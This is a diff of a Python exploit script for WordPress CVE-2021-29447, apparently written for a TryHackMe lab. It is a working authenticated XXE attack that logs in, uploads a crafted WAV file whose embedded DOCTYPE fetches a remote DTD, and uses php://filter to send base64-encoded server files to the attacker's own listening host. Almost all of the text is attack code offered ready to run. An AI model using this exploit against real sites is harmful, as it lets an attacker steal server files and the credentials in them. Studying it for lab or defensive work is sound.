@@ -1,37 +1,24 @@
 #! /usr/bin/env python3
 
-#### Title: Exploit Get Shell - WordPress
+#### Title: Exploit Read File - WordPress XXE Vuln Authenticated
 #### Author: 0xEtern4lW0lf
-#### Created: 18 Dez 2022
-#### Description: TEMPLATE
+#### Created: 29 Dez 2022
+#### Description: This exploits the WordPress XXE vulnerability. Allow read server files.
 #### CVE-2021-29447
+#### Refer: https://tryhackme.com/room/wordpresscve202129447
 
 #### ========= MODULES =========
 
-# hardler
-import socket, telnetlib
-from threading import Thread
+# python server
+import subprocess, sys, os
 
 # http lib
-import requests, urllib, urllib3
-urllib3.disable_warnings()
-
-import argparse
-import sys
-import base64
-import time
-
-import argparse
-import base64
-import os
-import pathlib
-import re
 import requests
-import subprocess
-import sys
+
+import argparse
+import base64
 import time
-from urllib.parse import urlparse
-import zlib
+import re
 
 
 #### ========= VARIABLE =========
@@ -48,9 +35,67 @@ proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 
 #### ========= FUNCTION =========
 
+## Banner
+def banner():
+  EwLogo = f"""
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⣀⠠⠤⢤⣤⣶⣴⣦⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⡞⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠻⢿⣷⣄⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣄⠈⠉⠛⠿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡯⣿⣷⡄⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠰⢾⣿⣿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢌⡻⢿⡆⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠝⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡌⠿⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠋⠀⣸⣧⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡄⠁
+⠀⠀⠀⠀⠀⠀⠀⢀⣾⣏⣴⠟⢻⣿⠟⠛⠶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⢻⣿⡀
+⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣴⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⢳⣜⣿⡇
+⠀⠀⠀⠀⠀⣠⣾⣿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⢿⣿⡇
+⠀⠀⢀⣤⣾⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠸⣿⠇
+⢀⣴⣿⡿⠋⠀⠀⠀⠀⠀⣀⣤⣶⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⢸⣿⡄⡿⠀
+⢺⣿⡏⠀⠀⠀⠀⢀⣤⣾⣿⠿⠛⠋⠙⠻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡝⣦⠀⣸⣿⡧⠃⠀
+⠀⠈⠉⠀⢠⣤⣶⣿⡿⠋⠀⠀⠀⠀⠀⡀⠈⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⣿⣷⣿⣿⠀⠀⠀
+⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⢀⡜⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡆⠀⠀⣼⡇⣾⣿⣿⠇⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⢻⣿⣀⣾⣿⢡⣿⡿⠋⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⡿⢣⣿⣿⣿⣿⣣⡿⠋⠁⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠀⠀⠀⠀⠀⣀⣠⣤⣴⣶⣿⠿⣋⣴⣿⣿⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⡇⠀⢀⣠⣶⣿⣿⡿⠟⠋⠉⠐⠊⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣇⣴⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀{RED}#--------------------------------------------#
+ _____  _                         ___  _  _    _  _____  _   __ 
+|  ___|| |                       /   || || |  | ||  _  || | / _|
+| |__  | |_   ___  _ __  _ __   / /| || || |  | || |/' || || |_ 
+|  __| | __| / _ \| '__|| '_ \ / /_| || || |/\| ||  /| || ||  _|
+| |___ | |_ |  __/| |   | | | |\___  || |\  /\  /\ |_/ /| || |  
+\____/  \__| \___||_|   |_| |_|    |_/|_| \/  \/  \___/ |_||_|  
+                                                                
+#----------------------------------------------------------------# 
+    
+    Author: {GREEN}0xEtern4lW0lf{END}                           
+    {RED}Site: {BLUE}https://0xetern4lw0lf.github.io/{END}
+
+    FOR EDUCATIONAL PURPOSE ONLY.
+
+  """
+  return print(f'{BLUE}{EwLogo}{END}')
+
+# Pretty loading wheel
+def loading(spins):
+
+    def spinning_cursor():
+        while True:
+            for cursor in '|/ -\\':
+                yield cursor
+
+    spinner = spinning_cursor()
+    for _ in range(spins):
+        sys.stdout.write(next(spinner))
+        sys.stdout.flush()
+        time.sleep(0.1)
+        sys.stdout.write('\b')
+
+
+
 def argument_parser():
     """Parse argument provided to the script."""
-    parser = argparse.ArgumentParser(description='WordPress CVE-2021-29447 authenticated exploit')
+    parser = argparse.ArgumentParser(description='WordPress CVE-2021-29447 Authenticated Exploit')
 
     parser.add_argument("-l", "--lhost",
                         required=True,
@@ -93,20 +138,22 @@ def argument_parser():
 
 ############## PYTHON SERVER ##############
 
-"""Start Python WebServer locally on port specified in argument (lhost URL)."""
+"""Start Python WebServer locally on port specified."""
 def start_python_server(lport):
     python_server = subprocess.Popen([sys.executable, "-m", "http.server", str(lport)], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
 
     os.set_blocking(python_server.stdout.fileno(), False)
 
+    print(f"\n{BLUE}[+] PYTHON SERVER: {YELLOW}Python Server start in port {GREEN}{lport} {BLUE}[+]{END}")
+
     return python_server
     
 
-"""Stop Python WebServer before exiting script."""  
+"""Stop Python WebServer."""  
 def stop_python_server(python_server):
     python_server.terminate()
 
-    print("Python server stopped")
+    print(f"\n{BLUE}[+] PYTHON SERVER: {YELLOW}Python Server Stopped {BLUE}[+]{END}")
 
 ############## ============== ##############
 
@@ -119,7 +166,7 @@ def createEvilWAV(lhost, lport):
     """Generate malicious WAV payload."""
     payload = b"""RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM 'http://""" + f"{lhost}:{lport}".encode('utf-8') + b"""/malicious.dtd'>%remote;%init;%trick;]>\x00"""
 
-    print("Malicous WAV generated" + '\n')
+    print(f"\n{BLUE}[+] PAYLOAD: {YELLOW}Payload file WAV created! {BLUE}[+]{END}")
 
     return payload
 
@@ -130,7 +177,7 @@ def createEvilDTD(lhost, lport, targetFile):
         file.write(f"""<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={targetFile}">\n""")
         file.write(f"""<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://{lhost}:{lport}/?p=%file;'>" >""")
 
-    print("DTD file payload created" + '\n')
+    print(f"{BLUE}[+] PAYLOAD: {YELLOW}Payload file DTD created! {BLUE}[+]{END}")
 
 ############## ======= ##############
 
@@ -151,15 +198,11 @@ def loginWP(rhost, user, password):
       'testcookie': 1
     }
 
-    r = requests.post(f"{rhost}/wp-login.php", data=data, allow_redirects=True)
+    r = requests.post(f"{rhost}/wp-login.php", data=data)
 
 
-    if not r.status_code == 200:
-        print(f"Bad response status : {r.status_code}")
-        print("Exiting ...")
-        exit(1)
-
-    print("Succesfull connection to WordPress server" + '\n')
+    if r.status_code == 200:
+        print(f"\n{BLUE}[+] LOGIN WP: {YELLOW}WordPress Logged {GREEN}SUCCESSFULLY! {BLUE}[+]{END}")
 
     return r.cookies
 
@@ -186,27 +229,11 @@ def sendPayload(rhost, cookies, payload):
     r = requests.post(f'{rhost}/wp-admin/async-upload.php', data=data, files=file_data, cookies=cookies)
 
     if r.status_code == 200:
-        if not r.json()['success']:
-            print("Error during payload upload")
-            print("Exiting ...")
-            exit(1)
-    
-    elif r.status_code == 502:
-        # TODO(investigate sometimes bad gateway response but exploitation ok)
-        pass
-    
-    elif r.status_code == 504:
-        # TODO(investigate sometimes gateway timeout response but exploitation ok for first payload)
-        print(f"Gateway timeout will work only for first payload : {r.status_code}")
-    
-    else:
-        print(f"Bad response status : {r.status_code}\n")
-        print(r.text)
-        print("Exiting ...")
-        exit(1)
+        if r.json()['success']:
+            print(f"\n{BLUE}[+] UPLOAD FILE: {YELLOW}File WAV upload SUCCESSFULLY! {BLUE}[+]{END}")
 
 
-def retrieve_targeted_file(python_server):
+def readFile(python_server,targetFile):
     """Retrieve information and files from Python WebServer stdout."""
     payload_printed = False
     retrieved_file_printed = False
@@ -223,8 +250,6 @@ def retrieve_targeted_file(python_server):
 
         if re.search(r'GET \/malicious\.dtd', line):
             if not payload_printed:
-                print("DTD payload retrievied from Python server" + '\n')
-                print(line + '\n')
                 payload_printed = True
 
         if re.search(r'\/\?p=', line):
@@ -232,18 +257,18 @@ def retrieve_targeted_file(python_server):
                 matched_file = re.search(r'\/\?p=(.+?)\s', line)
                 if matched_file:
                     file = matched_file.group(1)
-                    print("Retrieved file : "  + '\n')
+                    print(f"{BLUE}[+] READ FILE: {GREEN}{targetFile} {YELLOW}file content {BLUE}[+]{END}\n")
                     print(base64.b64decode(file).decode('utf-8'))
                 retrieved_file_printed = True
 
     if payload_printed and not retrieved_file_printed:
-        print("File not found on server or not permission to read it" + '\n')
+        print(f"\n{BLUE}[+] ERROR: {RED}File not found on server or not permission to read it {BLUE}[+]{END}")
 
     if not payload_printed and not retrieved_file_printed:
-        print("Error WAV payload not executed on WordPress")
+        print(f"\n{BLUE}[+] ERROR: {RED}Error WAV payload not executed on WordPress {BLUE}[+]{END}")
 
     if printing_error:
-        print("Exiting ...")
+        print(f"\n{BLUE}[+] ERROR: {RED}Exiting... {BLUE}[+]{END}")
         exit(1)
 
 
@@ -278,7 +303,7 @@ def main():
     
     time.sleep(2)
 
-    retrieve_targeted_file(python_server)
+    readFile(python_server, targetFile)
 
     stop_python_server(python_server)
 
@@ -288,4 +313,5 @@ def main():
 #### EXECUTION
 
 if __name__ == '__main__':
+    banner()
     main()
